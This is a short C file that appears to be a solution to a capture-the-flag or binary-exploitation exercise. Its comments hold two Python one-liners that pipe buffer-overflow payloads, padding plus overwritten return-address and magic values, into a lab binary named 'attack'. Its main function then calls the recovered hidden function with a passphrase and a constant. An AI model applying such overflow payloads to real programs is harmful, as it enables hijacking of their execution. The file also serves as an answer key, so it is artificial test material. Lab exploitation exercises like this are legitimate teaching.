#include <stdio.h>

int main () {
    /* call hidden function from object.o with the "key1 key2" argument */
    // key1 : python -c 'print "A" * 80 +  "\xef\xbe\xad\xde" ' | ./attack
    // key2 : python -c 'print "A" * 76 + "\x2c\x93\x04\x08"+  "\xef\xbe\xad\xde" ' | ./attack
    bypass_surgery("blue lips pulse and rapid breathing", 0xf00dbabe);

    return 0;
}
